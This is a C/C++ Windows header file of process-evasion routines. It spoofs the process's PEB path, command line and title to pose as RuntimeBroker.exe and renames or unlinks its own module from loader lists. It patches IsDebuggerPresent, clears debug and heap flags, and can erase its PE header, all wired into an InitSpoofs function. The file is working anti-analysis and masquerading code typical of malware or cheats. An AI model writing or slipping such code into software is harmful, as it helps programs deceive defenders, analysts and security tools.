#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#pragma comment(lib, "psapi.lib")


// ── Manual struct definitions ──
typedef struct _UNICODE_STRING_FULL {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_FULL;

typedef struct _RTL_USER_PROCESS_PARAMETERS_FULL {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING_FULL ImagePathName;
    UNICODE_STRING_FULL CommandLine;
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING_FULL WindowTitle;
} RTL_USER_PROCESS_PARAMETERS_FULL;

typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING_FULL FullDllName;
    UNICODE_STRING_FULL BaseDllName;
} LDR_DATA_TABLE_ENTRY_FULL;

typedef struct _PEB_LDR_DATA_FULL {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_FULL;

typedef struct _PEB_FULL {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PEB_LDR_DATA_FULL* Ldr;
    RTL_USER_PROCESS_PARAMETERS_FULL* ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PVOID PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
} PEB_FULL;

// ── Helper to set UNICODE_STRING_FULL ──
void SetUnicodeString(UNICODE_STRING_FULL* us, const wchar_t* str) {
    us->Buffer = (PWSTR)str;
    us->Length = (USHORT)(wcslen(str) * sizeof(wchar_t));
    us->MaximumLength = us->Length + sizeof(wchar_t);
}

// ── Spoof all PEB name fields ──
void SpoofFullPEB() {
    PEB_FULL* peb = (PEB_FULL*)__readgsqword(0x60);
    RTL_USER_PROCESS_PARAMETERS_FULL* params = peb->ProcessParameters;

    const wchar_t* fakePath  = L"C:\\Windows\\System32\\RuntimeBroker.exe";
    const wchar_t* fakeCmd   = L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding";
    const wchar_t* fakeTitle = L"RuntimeBroker";

    SetUnicodeString(&params->ImagePathName, fakePath);
    SetUnicodeString(&params->CommandLine,   fakeCmd);
    SetUnicodeString(&params->WindowTitle,   fakeTitle);
}

// ── Unlink from all three PEB module lists ──
void HideModuleFromPEB(HMODULE hModule) {
    PEB_FULL* peb = (PEB_FULL*)__readgsqword(0x60);
    PEB_LDR_DATA_FULL* ldr = peb->Ldr;

    LIST_ENTRY* lists[] = {
        &ldr->InLoadOrderModuleList,
        &ldr->InMemoryOrderModuleList,
        &ldr->InInitializationOrderModuleList
    };

    for (auto list : lists) {
        LIST_ENTRY* entry = list->Flink;
        while (entry != list) {
            LDR_DATA_TABLE_ENTRY_FULL* mod = CONTAINING_RECORD(
                entry, LDR_DATA_TABLE_ENTRY_FULL, InLoadOrderLinks);
            entry = entry->Flink;
            if (mod->DllBase == hModule) {
                mod->InLoadOrderLinks.Blink->Flink = mod->InLoadOrderLinks.Flink;
                mod->InLoadOrderLinks.Flink->Blink = mod->InLoadOrderLinks.Blink;
            }
        }
    }
}

// ── Spoof module name in PEB ──
void SpoofModuleName(HMODULE hModule, const wchar_t* fakeName) {
    PEB_FULL* peb = (PEB_FULL*)__readgsqword(0x60);
    PEB_LDR_DATA_FULL* ldr = peb->Ldr;
    LIST_ENTRY* list = &ldr->InLoadOrderModuleList;
    LIST_ENTRY* entry = list->Flink;

    while (entry != list) {
        LDR_DATA_TABLE_ENTRY_FULL* mod = CONTAINING_RECORD(
            entry, LDR_DATA_TABLE_ENTRY_FULL, InLoadOrderLinks);
        entry = entry->Flink;
        if (mod->DllBase == hModule) {
            SetUnicodeString(&mod->FullDllName, fakeName);
            SetUnicodeString(&mod->BaseDllName, fakeName);
        }
    }
}

// ── Hook IsDebuggerPresent to always return false ──
void PatchIsDebuggerPresent() {
    BYTE* func = (BYTE*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "IsDebuggerPresent");
    DWORD oldProtect;
    VirtualProtect(func, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
    // xor eax, eax; ret
    func[0] = 0x31;
    func[1] = 0xC0;
    func[2] = 0xC3;
    VirtualProtect(func, 6, oldProtect, &oldProtect);
}

// ── Clear BeingDebugged flag in PEB ──
void ClearDebugFlag() {
    PEB_FULL* peb = (PEB_FULL*)__readgsqword(0x60);
    peb->BeingDebugged = 0;
    // Clear NtGlobalFlag
    *(DWORD*)((BYTE*)peb + 0xBC) = 0;
}

// ── Spoof heap flags ──
void SpoofHeapFlags() {
    PVOID heap = (PVOID)*(ULONG_PTR*)((BYTE*)__readgsqword(0x60) + 0x30);
    // Clear debug heap flags
    *(DWORD*)((BYTE*)heap + 0x40) &= ~0x40;
    *(DWORD*)((BYTE*)heap + 0x44) &= ~0x100;
}

// ── Anti-debug (exit if detected) ──
void AntiDebug() {
    if (IsDebuggerPresent()) ExitProcess(0);
    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    if (remote) ExitProcess(0);
}

// ── Erase PE header ──
void ErasePEHeader() {
    HMODULE hModule = GetModuleHandle(NULL);
    DWORD oldProtect;
    VirtualProtect(hModule, 0x1000, PAGE_READWRITE, &oldProtect);
    memset(hModule, 0, 0x1000);
    VirtualProtect(hModule, 0x1000, oldProtect, &oldProtect);
}

// ── Randomized sleep ──
void RandomSleep() {
    srand(GetTickCount());
    Sleep(50 + rand() % 200);
}


// ── Init all spoofs ──
void InitSpoofs() {
    //AntiDebug();
    ClearDebugFlag();
    SpoofHeapFlags();
    PatchIsDebuggerPresent();
    SpoofFullPEB();
    SpoofModuleName(GetModuleHandle(NULL), L"RuntimeBroker.exe");
    //HideModuleFromPEB(GetModuleHandle(NULL));
    //ErasePEHeader();
    //RandomSleep();
}